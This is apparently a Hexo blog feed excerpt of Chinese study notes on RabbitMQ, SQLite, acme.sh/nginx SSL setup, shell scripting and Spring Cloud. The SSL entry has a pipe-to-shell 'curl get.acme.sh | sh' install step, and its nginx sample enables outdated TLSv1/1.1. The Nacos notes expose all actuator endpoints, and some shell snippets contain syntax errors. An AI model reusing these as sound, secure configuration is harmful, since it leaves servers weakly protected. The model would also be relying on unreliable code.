<p><strong>如果消息回退和备份交换机同时开启，谁会优先执行</strong>：经检测：备份交换机优先级更高</p>
<h3 id="幂等性"><a href="#幂等性" class="headerlink" title="幂等性"></a>幂等性</h3><p>应用场景：消息重复消费。消费者再消费MQ时，已经处理完了该信息，但是再返回ack确认时，网络中断。故MQ会重新发送这条消息给该消费者或其他消费者。这就会导致重复消费。<br>解决办法：使用全局ID表示。可以用时间戳或者UUID的一个全局唯一ID。<br>两种操作<br>a. 唯一ID+指纹码机制<br>b. 利用redis的原子性去实现<br>redis原生具有setnx。天生具有幂等性判断。</p>
<h3 id="优先级队列"><a href="#优先级队列" class="headerlink" title="优先级队列"></a>优先级队列</h3><p>使用场景：订单催送。<br>一般情况下，队列中的消息是先进先出的顺序。但是使用了优先级队列，那么优先级高的可以先被消费<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-09-07-29.png"><br>官方允许最大优先级的数量为(0-255)<br>他的关键实现就是对队列设置优先级和消息设置优先级。</p>
<h3 id="惰性队列"><a href="#惰性队列" class="headerlink" title="惰性队列"></a>惰性队列</h3><p>惰性队列的消息是保存在磁盘中的。他的消费速度会比较慢<br>常用于消费者宕机或者下线维护时。这样子就不会消息堆积导致消息丢失了。<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-18-34-13.png"><br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-11-31-19.png"></p>
<h2 id="RabbitMQ集群"><a href="#RabbitMQ集群" class="headerlink" title="RabbitMQ集群"></a>RabbitMQ集群</h2><p><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-09-15-28-51.png"></p>
]]></content>
      <categories>
        <category>RabbitMQ</category>
      </categories>
  </entry>
  <entry>
    <title>SQLite：单线程数据库，适用于小型项目</title>
    <url>/posts/24c233fa/</url>
    <content><![CDATA[<p>SQLite是一个嵌入式数据库引擎，它被设计为单线程访问。这意味着在默认情况下，SQLite不支持多线程并发访问同一个数据库连接。当多个线程尝试同时访问同一个数据库连接时，可能会导致数据库文件损坏或产生不可预测的结果。<br>但是其实作为嵌入式数据库，他本身已经可以支撑的起小型项目了。前期都可以用sqlite来维系数据库</p>
]]></content>
      <tags>
        <tag>Sqlite</tag>
      </tags>
  </entry>
  <entry>
    <title>SSL证书配置、自动部署和Nginx集成</title>
    <url>/posts/f1d3065d/</url>
    <content><![CDATA[<p>关于如何配置ssl证书和自动装配，并且部署到nginx的服务器上。</p>
<ol>
<li>首先在freessl.cn部署一个ssl证书，可以是泛域名的。他只有一个月。搭配上acme就可以永久部署了。</li>
<li>具体步骤如下<br><img src="https://memos.zfxt.top/o/r/38/ebc20383-54b0-4170-801a-9894a5758680/1682350299_image.png" alt="image"><br>先获得ssl泛域名证书。</li>
<li>然后安装acme完成自动化部署。</li>
</ol>
<p>安装使用下面这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://get.acme.sh | sh -s email=my@example.com</span><br></pre></td></tr></table></figure>

<p>可以根据上面这个模板进行修改。最后就算部署完成，可以正常浏览你的网站了.安装完成后，就根据freessl给你的命令，直接复制到你的服务器执行，然后就在服务器上安装好自动更新的证书了。但是此时的证书任然没有部署到域名上，仍然需要操作</p>
<hr>
<p>部署好后，请记住你的证书安装的地址，这个之后部署到nginx上需要使用。</p>
<h3 id="nginx部署ssl证书"><a href="#nginx部署ssl证书" class="headerlink" title="nginx部署ssl证书"></a>nginx部署ssl证书</h3><p>最好的做法不是直接修改<code>nginx.conf</code> 文件，而是在<code>conf.d</code> 文件夹下添加与你相关的服务的信息。<br>如果没有conf.d文件夹可以自己创建。然后再nginx.conf里引用你创建的文件即可。<br>下面是一个示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name memos.zfxt.top;</span><br><span class="line">        add_header Strict-Transport-Security max-age=15768000;</span><br><span class="line">        <span class="built_in">return</span> 301 https://$server_name<span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen 443 ssl;</span><br><span class="line">        server_name memos.zfxt.top;</span><br><span class="line">        <span class="comment"># 下面ssl开头的是HTTPS相关的设置</span></span><br><span class="line">        ssl on;</span><br><span class="line">        ssl_certificate           /root/.acme.sh/*.zfxt.top_ecc/fullchain.cer;</span><br><span class="line">        ssl_certificate_key     /root/.acme.sh/*.zfxt.top_ecc/*.zfxt.top.key;</span><br><span class="line">        ssl_session_timeout     3600m;#session有效期，根据需要适当延长</span><br><span class="line">        ssl_session_cache       shared:SSL:10m;</span><br><span class="line">        <span class="comment"># 使用的加解密方式</span></span><br><span class="line">        ssl_ciphers             ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">        <span class="comment"># 支持的协议类型</span></span><br><span class="line">        ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        <span class="comment"># 优先使用服务端的加解密方式</span></span><br><span class="line">        ssl_prefer_server_ciphers on;     </span><br><span class="line">        location / &#123;</span><br><span class="line">            <span class="comment"># 单个服务</span></span><br><span class="line">            proxy_pass http://127.0.0.1:5230/;</span><br><span class="line">            <span class="comment"># 负载均衡</span></span><br><span class="line">            <span class="comment"># proxy_pass http://yourServers/;            </span></span><br><span class="line">            proxy_redirect off;           </span><br><span class="line">            proxy_set_header        X-Real-IP           <span class="variable">$remote_addr</span>;</span><br><span class="line">            proxy_set_header        X-Forwarded-For     <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            proxy_set_header        Host                <span class="variable">$http_host</span>;</span><br><span class="line">            proxy_set_header        X-NginX-Proxy       <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>nginx</tag>
        <tag>ssl证书</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell脚本中的表达式和流程控制</title>
    <url>/posts/32062179/</url>
    <content><![CDATA[<h2 id="表达式运算符"><a href="#表达式运算符" class="headerlink" title="表达式运算符"></a>表达式运算符</h2><p>$(())或者$[]都可以用来在内部写表达式，运算操作符。</p>
<h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2><p>[ condition ]（condition前后要有空格）<br>非空返回true<br>判断字符串相等，用&#x3D;。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;ok&quot;</span> = <span class="string">&quot;ok&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;equal&quot;</span></span><br><span class="line"><span class="string">elif [ 条件判断式 ]</span></span><br><span class="line"><span class="string">then</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">## case语句</span></span><br><span class="line"><span class="string">case $变量 in</span></span><br><span class="line"><span class="string">&quot;变量1&quot;)</span></span><br><span class="line"><span class="string">执行命令</span></span><br><span class="line"><span class="string">;;</span></span><br><span class="line"><span class="string">&quot;变量2&quot;)</span></span><br><span class="line"><span class="string">执行命令2</span></span><br><span class="line"><span class="string">;;</span></span><br><span class="line"><span class="string">esac</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.</span><br><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 值1 值2 值3.。。</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">程序/代码</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">2.</span><br><span class="line"><span class="keyword">for</span>(( 初始值；循环控制条件；变量变化))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">程序/代码</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> [ 条件判断式 ]</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">程序</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h2 id="读取控制台输入"><a href="#读取控制台输入" class="headerlink" title="读取控制台输入"></a>读取控制台输入</h2><p>read (选项)(参数)<br>-p:指定读值时的提示符。<br>-t:指定读取值时等待的秒数。如果一定时间内没输入，就退出。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入一个数Num1=&quot;</span> NUM1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请在10s内请输入一个数Num1=&quot;</span> NUM1 -t 10</span><br></pre></td></tr></table></figure>
<h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><p>basename可以获取文件的文件名<br>dirname，可以获取文件的路径</p>
<h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><p>他的参数可以动态的获取</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getSum</span></span>()&#123;</span><br><span class="line">    SUM=$[ <span class="variable">$n1</span>+<span class="variable">$n2</span> ]</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;和是 <span class="variable">$SUM</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">n1 = 10</span><br><span class="line">n2 = 20</span><br><span class="line">getSum <span class="variable">$n1</span> <span class="variable">$n2</span></span><br></pre></td></tr></table></figure>
<p>类似js</p>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell脚本：命令解释和脚本编写</title>
    <url>/posts/e1f35603/</url>
    <content><![CDATA[<p>shell是一个命令解释器，用来向内核发送请求。<br>通过写shell脚本，通过shell执行。（bashshell）</p>
<h3 id="脚本格式"><a href="#脚本格式" class="headerlink" title="脚本格式"></a>脚本格式</h3><p><code>#!/bin/bash开头</code><br>脚本要有执行权限。<br>或者使用sh来执行脚本，他可以不需要执行权限。<br>sh hello.sh</p>
<h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><p>A&#x3D;100<br>调用该变量时需要使用$</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">A=100</span><br><span class="line"><span class="built_in">echo</span> A=<span class="variable">$A</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;A=<span class="variable">$A</span>&quot;</span></span><br><span class="line"><span class="comment">#这两个的输出结果是一样的。都是A=100</span></span><br><span class="line"><span class="comment">#只有$A才会被解析</span></span><br><span class="line"><span class="comment">#撤销变量</span></span><br><span class="line"><span class="built_in">unset</span> A</span><br><span class="line"><span class="comment">#声明静态变量</span></span><br><span class="line"><span class="comment">#只会定义一次，不会被反复初始化。而且不能被unset</span></span><br><span class="line"><span class="built_in">readonly</span> B=2</span><br><span class="line"><span class="comment">#在shell中，等号两侧不允许又空格</span></span><br><span class="line"><span class="comment">## 将命令的返回值返回出去</span></span><br><span class="line">A=`data` or A=$(data)</span><br><span class="line"><span class="comment">#其中data是命令。</span></span><br></pre></td></tr></table></figure>
<h2 id="定义全局变量"><a href="#定义全局变量" class="headerlink" title="定义全局变量"></a>定义全局变量</h2><p>export。可以在&#x2F;etc&#x2F;profile中写入。然后通过source命令刷新。也可以部分权限。写入bashrc中也可以<br>所谓全局变量，就是指变量在当前的整个 Shell 进程中都有效。每个 Shell 进程都有自己的作用域，彼此之间互不影响。在 Shell 中定义的变量，默认就是全局变量。</p>
<p>需要强调的是，全局变量的作用范围是当前的 Shell 进程，而不是当前的 Shell 脚本文件，它们是不同的概念。打开一个 Shell 窗口就创建了一个 Shell 进程，打开多个 Shell 窗口就创建了多个 Shell 进程，每个 Shell 进程都是独立的，拥有不同的进程 ID。<br>在一个 Shell 进程中可以使用 source 命令执行多个 Shell 脚本文件，此时全局变量在这些脚本文件中都有效。</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#单行注释使用`#`</span></span><br><span class="line">多行注释使用</span><br><span class="line">:&lt;&lt;!</span><br><span class="line">其中是被注释的内容。</span><br><span class="line">!</span><br></pre></td></tr></table></figure>
<h2 id="位置参数变量"><a href="#位置参数变量" class="headerlink" title="位置参数变量"></a>位置参数变量</h2><p>执行shell脚本时，直接后置参数传入。<br>比如：<code>./myshell.sh 100 200</code><br>这就是一个执行shell的命令行。</p>
<ol>
<li>$n表示第几个参数，10以上的参数需要用${10}之类</li>
<li>$*表示所有的参数</li>
<li>$@表示所有的参数。</li>
<li>$#表示参数的个数</li>
</ol>
<pre><code>
## 预定义变量
$$当前进程的PID
$!后台运行最后一个进程的pid
</code></pre>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(10)</title>
    <url>/posts/bb15ea4/</url>
    <content><![CDATA[<h1 id="分布式请求链路监控Sleuth"><a href="#分布式请求链路监控Sleuth" class="headerlink" title="分布式请求链路监控Sleuth"></a>分布式请求链路监控Sleuth</h1><p>在微服务框架中，一个由客户端发起的请求在后端系统中会经过多个不同的的服务节点调用来协同产生最后的请求结果，每一个前段请求都会形成一条复杂的分布式服务调用链路，链路中的任何一环出现高延时或错误都会引起整个请求最后的失败。</p>
<h2 id="zipkin-dashboard监控"><a href="#zipkin-dashboard监控" class="headerlink" title="zipkin dashboard监控"></a>zipkin dashboard监控</h2><ol>
<li>下载zipkin的jar包，然后直接运行jar包<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(10)-2023-11-08-37-40.png"><br>出现以上界面就算zipkin部署完成<br>然后访问<code>localhost:9411/zipkin/</code>即可访问<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(10)-2023-11-20-46-19.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(10)-2023-11-16-34-07.png"></li>
<li>依次启用8001，80微服务<br>当然这些服务理应完成一些配置<br><strong>POM.XML:</strong><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        包含了zipkin+sleuth--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zipkin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<strong>applicaiton.yml:</strong><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-payment-service</span></span><br><span class="line">  <span class="attr">zipkin:</span></span><br><span class="line">    <span class="attr">base-url:</span> <span class="string">http://localhost:9411</span></span><br><span class="line">    <span class="attr">sleuth:</span></span><br><span class="line">      <span class="attr">sampler:</span></span><br><span class="line">        <span class="comment"># 采样率介于0与1之间，1表示全部采集</span></span><br><span class="line">        <span class="attr">probalility:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<img src="https://image.zfxt.top/hexo-blog/SpringCloud(10)-2023-11-11-06-09.png"></li>
</ol>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(2)</title>
    <url>/posts/2aad0ec3/</url>
    <content><![CDATA[<h1 id="微服务模块构建流程"><a href="#微服务模块构建流程" class="headerlink" title="微服务模块构建流程"></a>微服务模块构建流程</h1><p>建module 改pom 改yml 主启动 业务类<br>建数据库 建entities 建dao 加service 加controller</p>
<h1 id="Devtools"><a href="#Devtools" class="headerlink" title="Devtools"></a>Devtools</h1><p>热部署，更新内容后自动重新启动</p>
<ol>
<li><p>添加jar包(放在子包中)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加插件(放入父类总工程)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                    &lt;fork&gt;true&lt;/fork&gt;--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">addResources</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addResources</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>开启自动编译的选项<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(2)-2023-09-06-11-40.png"></p>
</li>
<li><p>按<code>ctrl+shirft+alt+/</code><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(2)-2023-09-14-09-02.png"><br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(2)-2023-09-06-22-00.png"></p>
</li>
</ol>
<h1 id="RestTemplate"><a href="#RestTemplate" class="headerlink" title="RestTemplate"></a>RestTemplate</h1><p>RestTemplate提供了多种编写访问Http服务的方法，<br>是一种简单便携的访问restful服务模板类，是Spring提供的用于访问Rest服务的客户端模板工具集。<br>与之类似的还有spring-database-template。redis-template</p>
<ol>
<li><p>配置bean</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">ApplicationContextConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> gsonHttpMessageConverter = GsonHttpMessageConverter()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里的原因是因为kotlin的反序列化有点难搞，你需要配置他的转换器为gson的转换器。</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">restTemplate</span><span class="params">()</span></span> = RestTemplate().apply &#123;</span><br><span class="line">        messageConverters.add(<span class="number">0</span>,gsonHttpMessageConverter)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//applicationContext.xml &lt;bean id=&quot;&quot; class=&quot;&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样子，每次spring都会为你自动配置一个restTemplate。</p>
</li>
<li><p>使用Resttemplate</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="string">&quot;/consumer&quot;</span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OrderController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> PAYMENT_URL = <span class="string">&quot;http://localhost:8001&quot;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> log = LoggerFactory.getLogger(javaClass)</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> restTemplate: RestTemplate</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/payment/create&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">create</span><span class="params">(payment: <span class="type">Payment</span>)</span></span>: CommonResult&lt;*&gt; &#123;</span><br><span class="line">        log.info(<span class="string">&quot;消费者创建订单:<span class="variable">$payment</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> restTemplate.postForObject(<span class="string">&quot;<span class="variable">$PAYMENT_URL</span>/payment/create&quot;</span>, payment)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(<span class="string">&quot;/payment/get/&#123;id&#125;&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">getPayment</span><span class="params">(<span class="meta">@PathVariable(<span class="string">&quot;id&quot;</span>)</span> id: <span class="type">Long</span>)</span></span>: CommonResult&lt;*&gt; &#123;</span><br><span class="line">        log.info(<span class="string">&quot;消费者查询订单&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject&lt;CommonResult&lt;Payment&gt;&gt;(<span class="string">&quot;<span class="variable">$PAYMENT_URL</span>/payment/get/<span class="variable">$id</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他的主要方法就是get或者postForObject。然后三个参数分别为地址，请求参数和返回值</p>
</li>
</ol>
<h1 id="工程同构"><a href="#工程同构" class="headerlink" title="工程同构"></a>工程同构</h1><p>为了解决一些冗余问题，如：<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(2)-2023-09-08-53-36.png"><br>这些entities类都是一模一样的<br>工程同构操作如下：</p>
<ol>
<li>建一个module<br>命名为<code>cloud-api-commons</code><br>然后导入以下依赖（因为以后要用）：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.8.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
然后把其他类中所有的entities都复制粘贴过来。<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(2)-2023-09-09-45-39.png"></li>
<li>maven install<br>然后调用maven的安装。</li>
<li>最后在需要使用的子module中引入这个jar包<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(2)-2023-09-23-15-38.png"><br>就算实现了工程同构了</li>
</ol>
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(11)</title>
    <url>/posts/12aa6fe5/</url>
    <content><![CDATA[<h1 id="Nacos服务注册和配置中心"><a href="#Nacos服务注册和配置中心" class="headerlink" title="Nacos服务注册和配置中心"></a>Nacos服务注册和配置中心</h1><h2 id="nacos安装"><a href="#nacos安装" class="headerlink" title="nacos安装"></a>nacos安装</h2><p>在官网下载压缩包<a href="https://nacos.io/zh-cn/docs/quick-start.html">https://nacos.io/zh-cn/docs/quick-start.html</a><br>然后执行对应的命令。<br>启动完成后，访问<code>localhost:8848/nacos</code>即可访问该界面。账号密码都是nacos</p>
<h2 id="服务注册中心"><a href="#服务注册中心" class="headerlink" title="服务注册中心"></a>服务注册中心</h2><ul>
<li><p>生产者：<br><strong>POM：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        alibabanacos--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.zfxt.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jetbrains.kotlin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kotlin-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>YML:</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos-provider</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>主启动类：</strong></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">NacosPayment9001</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    runApplication&lt;NacosPayment9001&gt;(*args)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>复制微服务：<br><img src="https://image.zfxt.top/hexo-blog/SpringCloud(11)-2023-11-04-23-09.png"></p>
</li>
<li><p>消费者：<br><strong>YML:</strong></p>
</li>
</ul>
